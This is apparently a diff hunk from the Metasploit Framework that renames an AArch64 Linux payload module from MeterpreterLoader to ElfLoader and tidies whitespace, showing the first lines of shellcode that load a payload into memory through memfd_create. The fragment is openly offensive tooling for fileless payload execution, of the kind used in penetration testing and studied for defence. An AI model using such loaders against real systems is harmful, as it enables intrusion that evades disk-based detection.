@@ -7,11 +7,11 @@
 #  Parameters: x0-x7
 #  Syscall offset: x8
 #  Return Address for BL: x30
-
-module Msf::Payload::Linux::Aarch64::MeterpreterLoader
+#
+module Msf::Payload::Linux::Aarch64::ElfLoader
   def in_memory_load(payload)
     in_memory_loader = [
-      # fd = memfd_create(NULL,MFD_CLOEXEC) 
+      # fd = memfd_create(NULL,MFD_CLOEXEC)
       0x0a0080d2, # 0x1000:	mov	x10, #0	0x0a0080d2
       0xea0300f9, # 0x1004:	str	x10, [sp]	0xea0300f9
       0xe0030091, # 0x1008:	mov	x0, sp	0xe0030091
